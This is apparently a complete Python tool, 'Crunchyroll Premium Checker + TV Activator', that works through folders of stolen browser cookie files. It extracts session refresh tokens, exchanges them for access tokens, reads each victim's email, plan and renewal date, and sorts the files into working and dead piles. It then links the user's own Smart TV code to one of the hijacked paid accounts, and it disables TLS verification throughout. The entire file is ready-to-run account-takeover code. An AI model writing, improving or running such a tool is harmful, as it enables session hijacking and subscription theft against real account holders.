import requests
import os
import json
import glob
import re
import shutil
import threading
import queue
from datetime import datetime
from typing import Dict, Optional, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed
import pytz
import base64
import uuid
import sys

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ===================== TV ACTIVATION =====================
BARO_WUA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36"
)
API_HOST = "https://beta-api.crunchyroll.com"


def activate_tv(bearer: str, code: str, timeout: int = 20):
    """Activate Crunchyroll Smart TV device code via bearer token."""
    clean_code = re.sub(r"[^A-Za-z0-9]", "", str(code or "")).upper().strip()
    if len(clean_code) != 6:
        return False, "invalid_code_format"

    last_err = "activation_failed"
    headers = {
        "Authorization": f"Bearer {bearer}",
        "User-Agent": BARO_WUA,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/activate",
    }
    for base in ("https://www.crunchyroll.com", API_HOST):
        try:
            r = requests.post(
                f"{base}/auth/v1/device",
                json={"user_code": clean_code},
                headers=headers,
                timeout=timeout,
                verify=False,
            )
            if r.status_code in (200, 201, 204):
                return True, ""
            last_err = f"http_{r.status_code}"
            try:
                j = r.json()
                if isinstance(j, dict):
                    err_code = j.get("code") or j.get("error") or j.get("message")
                    if err_code:
                        last_err = str(err_code)
            except ValueError:
                pass
            if any(k in last_err.lower() for k in ("invalid", "expired", "not_found", "user_code")):
                return False, last_err
        except requests.RequestException as e:
            last_err = f"network: {str(e)[:60]}"
    return False, last_err


# ===================== THREAD-LOCAL SESSIONS =====================
_tls = threading.local()


def _get_session() -> requests.Session:
    s = getattr(_tls, "session", None)
    if s is None:
        s = requests.Session()
        s.verify = False
        _tls.session = s
    return s


# ===================== CHECKER =====================
class CrunchyrollChecker:

    def __init__(self):
        self.timeout = 20
        self.debug = False

    @property
    def session(self):
        return _get_session()

    def parse_cookies(self, file_path: str) -> Dict:
        """Enhanced cookie parser — 9 methods for maximum compatibility."""
        cookies = {}
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # METHOD 1: Netscape format
            for line in content.split('\n'):
                line = line.strip()
                if not line or line.startswith('#') or line.startswith('//'):
                    continue
                if line.startswith('#HttpOnly_'):
                    line = line[10:]
                parts = line.split('\t')
                if len(parts) >= 7:
                    name, value = parts[5].strip(), parts[6].strip()
                    if name and value:
                        cookies[name] = value
                elif '\t' in line:
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        name, value = parts[0].strip(), parts[1].strip()
                        if name and value:
                            cookies[name] = value
                elif '=' in line and not line.startswith('{'):
                    parts = line.split('=', 1)
                    if len(parts) == 2:
                        name, value = parts[0].strip(), parts[1].strip()
                        if name and value and not name.startswith('#'):
                            cookies[name] = value

            # METHOD 2: Extract etp_rt
            etp_patterns = [
                r'etp_rt[=\s]+([a-f0-9-]{36})',
                r'etp_rt["\']?\s*:\s*["\']([^"\']+)',
                r'rt_id["\']?\s*:\s*["\']([^"\']+)',
                r'ETP_RT[=\s]+([a-f0-9-]+)',
                r'etp_rt\s+([a-f0-9-]{36})',
                r'etp_rt[=\s]*([a-f0-9-]+)',
                r'["\']etp_rt["\']\s*:\s*["\']([^"\']+)',
            ]
            for pattern in etp_patterns:
                m = re.search(pattern, content, re.IGNORECASE)
                if m:
                    val = m.group(1).strip()
                    if len(val) >= 20:
                        cookies['etp_rt'] = val
                        break

            # METHOD 3: JWT decode
            jwt_patterns = [
                r'etp_jwt[=\s]+([^\s;]+)',
                r'etp_jwt["\']?\s*:\s*["\']([^"\']+)',
                r'ETP_JWT[=\s]+([^\s;]+)',
            ]
            for pattern in jwt_patterns:
                m = re.search(pattern, content, re.IGNORECASE)
                if m:
                    jwt_value = m.group(1).strip()
                    cookies['etp_jwt'] = jwt_value
                    try:
                        if jwt_value.startswith('eyJ') and '.' in jwt_value:
                            parts = jwt_value.split('.')
                            if len(parts) >= 2:
                                payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
                                data = json.loads(base64.b64decode(payload))
                                if data.get('rt_id'):
                                    cookies['etp_rt'] = data['rt_id']
                                if data.get('anonymous_id'):
                                    cookies['ajs_anonymous_id'] = data['anonymous_id']
                                if data.get('device_id'):
                                    cookies['device_id'] = data['device_id']
                    except Exception:
                        pass
                    break

            # METHOD 4: ajs_anonymous_id
            for pattern in [
                r'ajs_anonymous_id[=\s]+([a-f0-9-]{36})',
                r'anonymous_id["\']?\s*:\s*["\']([^"\']+)',
                r'["\']ajs_anonymous_id["\']\s*:\s*["\']([^"\']+)',
            ]:
                m = re.search(pattern, content, re.IGNORECASE)
                if m:
                    cookies['ajs_anonymous_id'] = m.group(1).strip()
                    break

            # METHOD 5: ajs_user_id
            for pattern in [
                r'ajs_user_id[=\s]+([a-f0-9-]{36})',
                r'["\']ajs_user_id["\']\s*:\s*["\']([^"\']+)',
            ]:
                m = re.search(pattern, content, re.IGNORECASE)
                if m:
                    cookies['ajs_user_id'] = m.group(1).strip()
                    break

            # METHOD 6: JSON extract
            try:
                jm = re.search(r'\{[^{}]*"(?:etp_rt|rt_id|anonymous_id|device_id)"[^{}]*\}', content)
                if jm:
                    data = json.loads(jm.group())
                    if isinstance(data, dict):
                        for k in ['etp_rt', 'rt_id']:
                            if data.get(k):
                                cookies['etp_rt'] = str(data[k])
                        for k in ['ajs_anonymous_id', 'anonymous_id']:
                            if data.get(k):
                                cookies['ajs_anonymous_id'] = str(data[k])
                        if data.get('device_id'):
                            cookies['device_id'] = str(data['device_id'])
            except Exception:
                pass

            # METHOD 7: Filename UUID
            filename = os.path.basename(file_path)
            uuid_pattern = r'([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})'
            if 'etp_rt' not in cookies:
                m = re.search(uuid_pattern, filename, re.IGNORECASE)
                if m:
                    cookies['etp_rt'] = m.group(1)

            # METHOD 8: Any UUID fallback
            if 'etp_rt' not in cookies:
                matches = re.findall(r'\b(' + uuid_pattern[1:], content, re.IGNORECASE)
                if matches:
                    cookies['etp_rt'] = matches[0]

            # METHOD 9: First 2000 chars deep scan
            if 'etp_rt' not in cookies:
                m = re.search(r'etp_rt[^a-f0-9-]+([a-f0-9-]{36})', content[:2000], re.IGNORECASE)
                if m:
                    cookies['etp_rt'] = m.group(1)

        except Exception as e:
            print(f"Error parsing {file_path}: {e}")

        return cookies

    def get_country_name(self, code: str) -> str:
        country_map = {
            "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
            "AO": "Angola", "AR": "Argentina", "AM": "Armenia", "AU": "Australia",
            "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas", "BH": "Bahrain",
            "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus", "BE": "Belgium",
            "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan", "BO": "Bolivia",
            "BA": "Bosnia and Herzegovina", "BW": "Botswana", "BR": "Brazil",
            "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
            "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
            "KY": "Cayman Islands", "CF": "Central African Republic", "TD": "Chad",
            "CL": "Chile", "CN": "China", "CO": "Colombia", "KM": "Comoros",
            "CG": "Congo", "CD": "Democratic Republic of the Congo", "CR": "Costa Rica",
            "CI": "Ivory Coast", "HR": "Croatia", "CU": "Cuba", "CY": "Cyprus",
            "CZ": "Czech Republic", "DK": "Denmark", "DJ": "Djibouti", "DM": "Dominica",
            "DO": "Dominican Republic", "EC": "Ecuador", "EG": "Egypt", "SV": "El Salvador",
            "GQ": "Equatorial Guinea", "ER": "Eritrea", "EE": "Estonia", "SZ": "Eswatini",
            "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland", "FR": "France",
            "GA": "Gabon", "GM": "Gambia", "GE": "Georgia", "DE": "Germany",
            "GH": "Ghana", "GR": "Greece", "GD": "Grenada", "GT": "Guatemala",
            "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana", "HT": "Haiti",
            "HN": "Honduras", "HU": "Hungary", "IS": "Iceland", "IN": "India",
            "ID": "Indonesia", "IR": "Iran", "IQ": "Iraq", "IE": "Ireland",
            "IL": "Israel", "IT": "Italy", "JM": "Jamaica", "JP": "Japan",
            "JO": "Jordan", "KZ": "Kazakhstan", "KE": "Kenya", "KI": "Kiribati",
            "KP": "North Korea", "KR": "South Korea", "KW": "Kuwait", "KG": "Kyrgyzstan",
            "LA": "Laos", "LV": "Latvia", "LB": "Lebanon", "LS": "Lesotho",
            "LR": "Liberia", "LY": "Libya", "LI": "Liechtenstein", "LT": "Lithuania",
            "LU": "Luxembourg", "MO": "Macau", "MK": "North Macedonia", "MG": "Madagascar",
            "MW": "Malawi", "MY": "Malaysia", "MV": "Maldives", "ML": "Mali",
            "MT": "Malta", "MH": "Marshall Islands", "MQ": "Martinique", "MR": "Mauritania",
            "MU": "Mauritius", "YT": "Mayotte", "MX": "Mexico", "FM": "Micronesia",
            "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
            "MS": "Montserrat", "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar",
            "NA": "Namibia", "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands",
            "NZ": "New Zealand", "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria",
            "NO": "Norway", "OM": "Oman", "PK": "Pakistan", "PW": "Palau",
            "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
            "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
            "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
            "RE": "Réunion", "ST": "São Tomé and Príncipe", "SA": "Saudi Arabia",
            "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles", "SL": "Sierra Leone",
            "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia", "SB": "Solomon Islands",
            "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan", "ES": "Spain",
            "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname", "SJ": "Svalbard and Jan Mayen",
            "SE": "Sweden", "CH": "Switzerland", "SY": "Syria", "TW": "Taiwan",
            "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand", "TL": "Timor-Leste",
            "TG": "Togo", "TK": "Tokelau", "TO": "Tonga", "TT": "Trinidad and Tobago",
            "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TC": "Turks and Caicos Islands",
            "TV": "Tuvalu", "UG": "Uganda", "UA": "Ukraine", "AE": "United Arab Emirates",
            "GB": "United Kingdom", "US": "United States", "UY": "Uruguay",
            "UZ": "Uzbekistan", "VU": "Vanuatu", "VE": "Venezuela", "VN": "Vietnam",
            "WF": "Wallis and Futuna", "EH": "Western Sahara", "YE": "Yemen",
            "ZM": "Zambia", "ZW": "Zimbabwe",
        }
        return country_map.get(code, code or 'Unknown')

    def check_cookie(self, filepath: str, working_folder: str, dead_folder: str) -> Tuple[Optional[Dict], str, str]:
        filename = os.path.basename(filepath)  # FIX: define first
        try:
            cookies = self.parse_cookies(filepath)

            if 'etp_rt' not in cookies or not cookies['etp_rt']:
                print(f"⚠️ No etp_rt found in {filename}")
                shutil.copy(filepath, os.path.join(dead_folder, filename))
                return None, "MISSING_COOKIES", "etp_rt not found"

            cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items() if k and v])
            anm_id = cookies.get('ajs_anonymous_id', '')

            # Token request
            headers = {
                "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://www.crunchyroll.com",
                "Referer": "https://www.crunchyroll.com/",
                "Cookie": cookie_str,
            }
            if anm_id:
                headers["ETP-Anonymous-Id"] = anm_id

            data = {
                "device_id": "c894736e-5659-4129-b4ad-9fdbd8211a01",
                "device_type": "Chrome on Windows",
                "grant_type": "etp_rt_cookie",
            }

            response = self.session.post(
                "https://www.crunchyroll.com/auth/v1/token",
                data=data, headers=headers, timeout=self.timeout,
            )

            if response.status_code != 200:
                print(f"❌ Token failed for {filename}: HTTP {response.status_code}")
                shutil.copy(filepath, os.path.join(dead_folder, filename))
                return None, "TOKEN_FAILED", f"HTTP {response.status_code}"

            token_data = response.json()
            if 'access_token' not in token_data:
                print(f"❌ No access_token for {filename}")
                shutil.copy(filepath, os.path.join(dead_folder, filename))
                return None, "NO_TOKEN", "No access_token"

            access_token = token_data['access_token']
            account_id = token_data.get('account_id', '')

            # User info
            uheaders = {
                "Authorization": f"Bearer {access_token}",
                "User-Agent": headers["User-Agent"],
                "Accept": "application/json, text/plain, */*",
                "Cookie": cookie_str,
            }
            response = self.session.get(
                "https://www.crunchyroll.com/accounts/v1/me",
                headers=uheaders, timeout=self.timeout,
            )
            if response.status_code != 200:
                print(f"❌ User info failed for {filename}: HTTP {response.status_code}")
                shutil.copy(filepath, os.path.join(dead_folder, filename))
                return None, "USER_FAILED", f"HTTP {response.status_code}"

            user_data = response.json()
            user_id = user_data.get('external_id', '')
            email = user_data.get('email', 'N/A')
            email_verified = user_data.get('email_verified', False)

            if not user_id:
                print(f"❌ No user ID for {filename}")
                shutil.copy(filepath, os.path.join(dead_folder, filename))
                return None, "NO_USER_ID", "No user ID"

            # Subscription
            sub_response = self.session.get(
                f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
                headers=uheaders, timeout=self.timeout,
            )
            if sub_response.status_code != 200:
                print(f"❌ Sub check failed for {filename}: HTTP {sub_response.status_code}")
                shutil.copy(filepath, os.path.join(dead_folder, filename))
                return None, "SUB_FAILED", f"HTTP {sub_response.status_code}"

            sub_data = sub_response.json()
            subscriptions = sub_data.get('subscriptions', [])
            if not subscriptions:
                print(f"❌ No subscription for {filename}")
                shutil.copy(filepath, os.path.join(dead_folder, filename))
                return None, "NO_SUBSCRIPTION", "No subscription found"

            subscription = subscriptions[0]
            plan = subscription.get('plan', {})
            tier = plan.get('tier', {})
            plan_display = tier.get('text', 'Unknown')
            plan_code = tier.get('value', 'Unknown')
            if plan_display == 'Unknown' or not plan_display:
                plan_display = plan.get('name', {}).get('value', 'Unknown').replace('cr_', '').replace('_', ' ').title()

            next_renewal = subscription.get('nextRenewalDate', '')
            days_left = "N/A"
            if next_renewal:
                try:
                    renewal_date = datetime.strptime(next_renewal.replace('Z', '+00:00'), "%Y-%m-%dT%H:%M:%S%z")
                    now = datetime.now(pytz.UTC)
                    days_left = max(0, (renewal_date - now).days)
                except Exception:
                    pass

            country_code = subscription.get('countryCode', '') or plan.get('countryCode', '')
            country = self.get_country_name(country_code)
            status = subscription.get('status', 'Unknown')

            # Save working file
            safe_email = email.replace('@', '_at_').replace('.', '_')
            output_file = os.path.join(working_folder, f"{safe_email}_{plan_code}.txt")

            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                full_content = f.read()

            output_lines = [
                "#" + "=" * 60,
                f"# Email: {email}",
                f"# Active: {'Yes' if status == 'active' else 'No'}",
                f"# Plan: {plan_display}",
                f"# Plan Code: {plan_code}",
                f"# Expires In: {days_left} days left" if days_left != "N/A" else "# Expires In: N/A",
                f"# Expiry Date: {next_renewal}",
                f"# Country: {country}",
                f"# Email Verified: {'Yes' if email_verified else 'No'}",
                f"# User ID: {user_id}",
                f"# Account ID: {account_id}",
                f"# Status: {status}",
                "#" + "=" * 60,
                "",
                "# Netscape HTTP Cookie File",
                "# ============================================================",
                "",
                full_content.strip(),
            ]
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(output_lines))

            print(f"✅ Working: {email} | {plan_display} | {days_left} days left")

            return {
                'email': email,
                'plan': plan_display,
                'plan_code': plan_code,
                'expiry': next_renewal,
                'days_left': days_left,
                'country': country,
                'status': status,
                'verified': str(email_verified),
                '_access_token': access_token,   # internal only
                '_file': output_file,            # internal only
            }, "WORKING", ""

        except Exception as e:
            print(f"❌ Error processing {filepath}: {e}")
            try:
                shutil.copy(filepath, os.path.join(dead_folder, filename))
            except Exception:
                pass
            return None, "ERROR", str(e)


# ===================== WORKER =====================
def process_cookie_worker(checker, filepath, working_folder, dead_folder):
    try:
        info, status, error = checker.check_cookie(filepath, working_folder, dead_folder)
        return info, status, error, filepath
    except Exception as e:
        return None, "ERROR", str(e), filepath


# ===================== MAIN =====================
def main():
    cookie_files = glob.glob("cookies/*.txt") + glob.glob("cookies/*.lce") + glob.glob("cookies/*.json")

    if not cookie_files:
        print("❌ No cookie files found in 'cookies' folder")
        return

    working_folder = "working_cookies"
    dead_folder = "dead_cookies"
    os.makedirs(working_folder, exist_ok=True)
    os.makedirs(dead_folder, exist_ok=True)

    # TV code input
    print("=" * 80)
    tv_raw = input("📺 Enter TV code to activate (6 chars, or press Enter to skip): ").strip()
    tv_code = re.sub(r"[^A-Za-z0-9]", "", tv_raw).upper()
    if tv_code and len(tv_code) != 6:
        print(f"⚠️ Invalid TV code '{tv_raw}' (must be 6 alphanumeric). Skipping TV activation.")
        tv_code = ""
    elif tv_code:
        print(f"✅ TV activation will be attempted with code: {tv_code}")

    try:
        num_threads = int(input("Enter number of threads (1-20, default 5): ") or "5")
        num_threads = max(1, min(20, num_threads))
    except ValueError:
        num_threads = 5

    print(f"\n{'=' * 80}")
    print(f"🍿 CRUNCHYROLL PREMIUM CHECKER v5.0 {'+ TV ACTIVATOR' if tv_code else ''}")
    print(f"{'=' * 80}")
    print(f"📂 Found {len(cookie_files)} files")
    print(f"⚡ Using {num_threads} threads")
    print(f"🌍 Checking subscriptions...")
    print(f"{'=' * 80}\n")

    checker = CrunchyrollChecker()
    working = []
    dead_count = 0
    processed = 0

    print("Processing cookies...\n")

    with ThreadPoolExecutor(max_workers=num_threads) as ex:
        futures = {
            ex.submit(process_cookie_worker, checker, fp, working_folder, dead_folder): fp
            for fp in cookie_files
        }
        for fut in as_completed(futures):
            filepath = futures[fut]
            processed += 1
            filename = os.path.basename(filepath)
            try:
                info, status, error, _ = fut.result()
            except Exception as e:
                info, status, error = None, "ERROR", str(e)

            if status == "WORKING" and info:
                working.append(info)
                email = info.get('email', 'N/A')[:30]
                plan = info.get('plan', 'Unknown')[:15]
                days = info.get('days_left', 'N/A')
                country = info.get('country', 'Unknown')[:15]
                print(f"✅ [{processed}/{len(cookie_files)}] {email:30} | {plan:15} | {str(days):>3}d left | {country:15}")
            else:
                dead_count += 1
                print(f"❌ [{processed}/{len(cookie_files)}] {status[:20]:20} | {filename[:50]}")

    print(f"\n{'=' * 80}")
    print("📊 SCAN SUMMARY")
    print(f"{'=' * 80}")
    print(f"✅ WORKING: {len(working)}")
    print(f"❌ DEAD/INVALID: {dead_count}")

    if working:
        plan_counts = {}
        country_counts = {}
        total_days = 0
        days_count = 0
        for w in working:
            plan_counts[w.get('plan', 'Unknown')] = plan_counts.get(w.get('plan', 'Unknown'), 0) + 1
            country_counts[w.get('country', 'Unknown')] = country_counts.get(w.get('country', 'Unknown'), 0) + 1
            if isinstance(w.get('days_left'), int):
                total_days += w['days_left']
                days_count += 1

        if plan_counts:
            print(f"\n📺 By Plan:")
            for plan, count in sorted(plan_counts.items(), key=lambda x: x[1], reverse=True):
                print(f"   {plan}: {count}")
        if country_counts:
            print(f"\n🌍 By Country:")
            for country, count in sorted(country_counts.items(), key=lambda x: x[1], reverse=True):
                print(f"   {country}: {count}")
        if days_count > 0:
            print(f"\n📅 Average Days Left: {total_days // days_count}")

    # ===== TV ACTIVATION PHASE =====
    if tv_code:
        print(f"\n{'=' * 80}")
        print(f"📺 TV ACTIVATION — Code: {tv_code}")
        print(f"{'=' * 80}")

        if not working:
            print("❌ No working accounts found — cannot activate TV.")
        else:
            activated = False
            activated_account = None

            for idx, w in enumerate(working, 1):
                token = w.get('_access_token')
                if not token:
                    continue
                email = w.get('email', 'N/A')
                print(f"🔍 [{idx}/{len(working)}] Trying: {email}...", end=" ", flush=True)
                ok, err = activate_tv(token, tv_code)

                if ok:
                    print("✅ SUCCESS")
                    activated = True
                    activated_account = w
                    # Mark on the output file
                    wfile = w.get('_file')
                    if wfile and os.path.exists(wfile):
                        try:
                            with open(wfile, 'a', encoding='utf-8') as f:
                                f.write(f"\n# TV Activation: ✅ SUCCESS (code: {tv_code})\n")
                        except Exception:
                            pass
                    break
                else:
                    print(f"❌ {err}")
                    if any(k in err.lower() for k in ("invalid", "expired", "not_found", "user_code")):
                        print("⚠️ TV code invalid/expired — stopping all TV attempts.")
                        break

            print(f"\n{'─' * 80}")
            if activated:
                print(f"✅ TV ACTIVATED!")
                print(f"   📟 Code:        {tv_code}")
                print(f"   📧 Account:     {activated_account.get('email')}")
                print(f"   📦 Plan:        {activated_account.get('plan')}")
                print(f"   🌍 Country:     {activated_account.get('country')}")
                print(f"   📅 Expiry:      {activated_account.get('expiry')}")
                print(f"   ⏳ Days Left:   {activated_account.get('days_left')}")
                print(f"   🍿 Your TV is ready to watch Crunchyroll!")
            else:
                print(f"❌ TV activation failed on all working accounts.")

    print(f"\n{'=' * 80}")
    if working:
        print(f"💾 Working cookies saved to: '{working_folder}/'")
        print(f"📁 Each file contains clean account details with # prefix + full cookie")
    print(f"{'=' * 80}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️ Stopped by user.")
    except Exception as e:
        print(f"\n❌ Error: {e}")
